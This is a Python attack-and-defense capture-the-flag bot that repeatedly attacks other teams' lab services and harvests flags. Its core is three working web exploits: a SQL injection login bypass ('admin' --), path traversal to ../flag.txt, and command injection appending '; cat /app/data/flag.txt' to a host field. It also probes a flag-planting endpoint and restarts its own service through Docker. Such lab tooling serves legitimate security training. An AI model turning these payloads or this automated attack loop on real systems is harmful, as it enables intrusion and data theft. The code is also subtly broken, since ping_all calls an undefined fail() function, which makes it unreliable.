#!/usr/bin/env python3
"""
Sandcastle CTF Bot — Attack & Defense automation
No integrated AI agent; purely scripted exploits.

Designed to run INSIDE a team's SSH container (team<N>-ssh).
The team ID is auto-detected from the container hostname (e.g. "team2-ssh" → 2).
Override with --my-team or the MY_TEAM env var.

Each team's vulnerable service is reachable at http://10.10.<N>.3:8080
from anywhere on the ctf-network (including all SSH containers).

Usage (inside the container):
    python bot.py --teams 4                 # attack all others once
    python bot.py --teams 4 --loop 60       # repeat every 60 s
    python bot.py --ping                    # ping sweep
    python bot.py --watchdog                # keep own service alive + attack loop
    python bot.py --teams 4 --fake-flag 2   # probe team2 plant endpoint

Deployed from the host via:
    ./deploy.sh 2 3 4                       # make teams 2, 3, 4 run this bot
"""

from __future__ import annotations

import argparse
import os
import re
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar
from typing import Optional

# ─────────────────────────────── config ────────────────────────────────────

SERVICE_PORT = 8080
FLAG_RE = re.compile(r"FLAG\{[a-f0-9]{32}\}")
TIMEOUT = 6  # seconds per HTTP request

# ─────────────────────────────── team detection ────────────────────────────

def detect_my_team() -> Optional[int]:
    """
    Infer our team ID from the container hostname (e.g. "team3-ssh" → 3).
    Falls back to MY_TEAM env var.
    """
    # Try env var first (explicit override)
    env = os.environ.get("MY_TEAM", "")
    if env.isdigit():
        return int(env)
    # Parse hostname: team<N>-ssh or team<N>-vuln or just team<N>
    hostname = socket.gethostname()
    m = re.match(r"team(\d+)", hostname)
    if m:
        return int(m.group(1))
    return None

# ─────────────────────────────── colours ───────────────────────────────────

RED    = "\033[31m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
CYAN   = "\033[36m"
RESET  = "\033[0m"

LOG_FILE = "/tmp/bot.log"

def _tee(line: str, *, err: bool = False) -> None:
    """Print to stdout/stderr AND append the plain (no ANSI) line to LOG_FILE."""
    (sys.stderr if err else sys.stdout).write(line + "\n")
    (sys.stderr if err else sys.stdout).flush()
    try:
        with open(LOG_FILE, "a") as _f:
            _f.write(line + "\n")
            _f.flush()
    except OSError:
        pass

def ok(msg: str)   -> None: _tee(f"{GREEN}[+]{RESET} {msg}")
def info(msg: str) -> None: _tee(f"{CYAN}[*]{RESET} {msg}")
def warn(msg: str) -> None: _tee(f"{YELLOW}[!]{RESET} {msg}")
def err(msg: str)  -> None: _tee(f"{RED}[-]{RESET} {msg}", err=True)

# ─────────────────────────────── helpers ───────────────────────────────────

def service_url(team_id: int) -> str:
    return f"http://10.10.{team_id}.3:{SERVICE_PORT}"


def _get(url: str, opener=None) -> Optional[str]:
    try:
        fn = opener.open if opener else urllib.request.urlopen
        with fn(url, timeout=TIMEOUT) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except (urllib.error.URLError, OSError):
        return None


def _post(url: str, data: dict, opener=None) -> Optional[str]:
    payload = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=payload)
    try:
        fn = opener.open if opener else urllib.request.urlopen
        with fn(req, timeout=TIMEOUT) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except (urllib.error.URLError, OSError):
        return None


def _post_json(url: str, body: str, extra_headers: dict | None = None) -> tuple[int, str]:
    req = urllib.request.Request(
        url,
        data=body.encode(),
        headers={"Content-Type": "application/json"},
    )
    for k, v in (extra_headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except (urllib.error.URLError, OSError) as e:
        return 0, str(e)

# ─────────────────────────────── service watchdog ──────────────────────────

def is_own_service_running(my_team: int) -> bool:
    """Check if teamN-vuln container is running (uses mounted Docker socket)."""
    result = subprocess.run(
        ["docker", "inspect", "--format", "{{.State.Running}}", f"team{my_team}-vuln"],
        capture_output=True, text=True,
    )
    return result.returncode == 0 and result.stdout.strip() == "true"


def restart_own_service(my_team: int) -> None:
    """
    Bring teamN-vuln back up via sandcastle-compose.yml.
    The service dir is bind-mounted at ~/service inside the SSH container.
    """
    import pathlib
    service_dir = pathlib.Path(f"/home/team{my_team}/service")
    if not service_dir.exists():
        err(f"Service dir {service_dir} not found — cannot restart")
        return
    info(f"Restarting team{my_team}-vuln …")
    subprocess.run(
        ["docker", "compose", "-f", "sandcastle-compose.yml", "up", "-d", "--build"],
        cwd=service_dir,
    )


def watchdog_tick(my_team: int) -> None:
    """Single watchdog check: restart own service if it's down."""
    if not is_own_service_running(my_team):
        warn(f"team{my_team}-vuln is DOWN — restarting")
        restart_own_service(my_team)
    else:
        info(f"team{my_team}-vuln is running OK")



def ping_team(team_id: int) -> bool:
    ip = f"10.10.{team_id}.3"
    result = subprocess.run(
        ["ping", "-c", "1", "-W", "2", ip],
        capture_output=True,
    )
    return result.returncode == 0


def ping_all(num_teams: int) -> None:
    info(f"Ping sweep — {num_teams} teams")
    for i in range(1, num_teams + 1):
        ip = f"10.10.{i}.3"
        alive = ping_team(i)
        if alive:
            ok(f"ping team{i} {ip} UP")
        else:
            fail(f"ping team{i} {ip} DOWN")

# ─────────────────────────────── health check ──────────────────────────────

def health_check(team_id: int) -> bool:
    body = _get(f"{service_url(team_id)}/health")
    return body is not None and "ok" in body

# ─────────────────────────────── exploits ──────────────────────────────────

def exploit_sqli(team_id: int) -> list[str]:
    """POST /login with SQLi bypass → read /notes as admin."""
    base = service_url(team_id)
    cj = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    body = _post(f"{base}/login", {"username": "admin' --", "password": "x"}, opener)
    if body is None:
        return []
    if "welcome, admin" not in body.lower():
        return []

    notes = _get(f"{base}/notes", opener)
    if notes is None:
        return []
    return FLAG_RE.findall(notes)


def exploit_path_traversal(team_id: int) -> list[str]:
    """GET /export?file=../flag.txt — no auth required."""
    qs = urllib.parse.urlencode({"file": "../flag.txt"})
    body = _get(f"{service_url(team_id)}/export?{qs}")
    if body is None:
        return []
    return FLAG_RE.findall(body)


def exploit_cmdi(team_id: int) -> list[str]:
    """POST /admin/diagnostics with shell injection — no auth required."""
    body = _post(
        f"{service_url(team_id)}/admin/diagnostics",
        {"host": "127.0.0.1; cat /app/data/flag.txt"},
    )
    if body is None:
        return []
    return FLAG_RE.findall(body)

# ─────────────────────────────── fake flag probe ───────────────────────────

def probe_plant_endpoint(team_id: int) -> None:
    """
    Hit /internal/plant with a deliberately wrong token to probe the endpoint.
    In a real A&D, you'd use the real token (stolen or guessed) to overwrite
    their flag with one you already own — here we just test reachability.
    """
    url = f"{service_url(team_id)}/internal/plant"
    import secrets
    fake_flag = f"FLAG\u007b{secrets.token_hex(16)}\u007d"
    code, body = _post_json(
        url,
        f'{{"flag": "{fake_flag}"}}',
        {"X-Plant-Token": "wrongtoken"},
    )
    if code == 0:
        warn(f"team{team_id} /internal/plant — unreachable")
    elif code == 403:
        info(f"team{team_id} /internal/plant — 403 (endpoint exists, token rejected)")
    elif code == 200:
        ok(f"team{team_id} /internal/plant — 200! Flag planted (token was accepted??)")
    else:
        info(f"team{team_id} /internal/plant — HTTP {code}: {body.strip()[:80]}")

# ─────────────────────────────── full attack ───────────────────────────────

EXPLOITS = [
    ("path_traversal", exploit_path_traversal),
    ("cmdi",           exploit_cmdi),
    ("sqli",           exploit_sqli),
]


def attack_team(team_id: int, my_team: int | None = None) -> list[str]:
    if team_id == my_team:
        return []

    info(f"── Attacking team{team_id} ({service_url(team_id)}) ──")

    if not ping_team(team_id):
        warn(f"team{team_id} — no ping response, skipping")
        return []

    if not health_check(team_id):
        warn(f"team{team_id} — /health failed, service may be down")

    all_flags: list[str] = []

    for name, fn in EXPLOITS:
        try:
            flags = fn(team_id)
        except Exception as exc:
            err(f"  [{name}] exception: {exc}")
            continue

        if flags:
            for f in flags:
                ok(f"  [{name}] FLAG: {f}")
            all_flags.extend(flags)
            break  # stop after first successful exploit
        else:
            warn(f"  [{name}] no flag found")

    return list(set(all_flags))


def attack_all(num_teams: int, my_team: int | None = None) -> dict[int, list[str]]:
    results: dict[int, list[str]] = {}
    for i in range(1, num_teams + 1):
        if i == my_team:
            continue
        flags = attack_team(i, my_team)
        if flags:
            results[i] = flags
    return results

# ─────────────────────────────── CLI ───────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Sandcastle CTF Bot — scripted A&D attacker (runs inside SSH container)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument("--teams",     type=int, default=4,   metavar="N",
                   help="total number of teams (default: 4)")
    p.add_argument("--my-team",   type=int, default=None, metavar="N",
                   help="override own team ID (auto-detected from hostname if omitted)")
    p.add_argument("--ping",      action="store_true",
                   help="ping sweep and exit")
    p.add_argument("--loop",      type=int, default=0,   metavar="SEC",
                   help="repeat attack loop every SEC seconds (0 = run once)")
    p.add_argument("--watchdog",  action="store_true",
                   help="also monitor and restart own service on each loop tick")
    p.add_argument("--fake-flag", type=int, default=None, metavar="TEAM",
                   help="probe /internal/plant on the given team and exit")
    p.add_argument("--attack-team", type=int, default=None, metavar="TEAM",
                   help="attack a single team and exit")
    return p


def main() -> int:
    args = build_parser().parse_args()

    # ── resolve own team ─────────────────────────────────────────────────
    my_team = args.my_team or detect_my_team()
    if my_team is None:
        warn("Could not detect team ID from hostname. Pass --my-team N explicitly.")
    else:
        info(f"Running as team{my_team} (hostname: {socket.gethostname()})")

    # ── single-action shortcuts ──────────────────────────────────────────
    if args.ping:
        ping_all(args.teams)
        return 0

    if args.fake_flag is not None:
        probe_plant_endpoint(args.fake_flag)
        return 0

    if args.attack_team is not None:
        flags = attack_team(args.attack_team, my_team)
        return 0 if flags else 1

    # ── attack loop ──────────────────────────────────────────────────────
    info(f"Bot started — {args.teams} team(s), my_team={my_team}, "
         f"interval={args.loop}s, watchdog={args.watchdog}")
    first = True
    while True:
        if not first:
            info(f"Sleeping {args.loop}s …")
            time.sleep(args.loop)
        first = False

        if args.watchdog and my_team is not None:
            watchdog_tick(my_team)

        results = attack_all(args.teams, my_team)
        total = sum(len(v) for v in results.values())
        ok(f"Round done — {total} flag(s) captured from {len(results)} team(s)")

        if args.loop == 0:
            break

    return 0


if __name__ == "__main__":
    sys.exit(main())
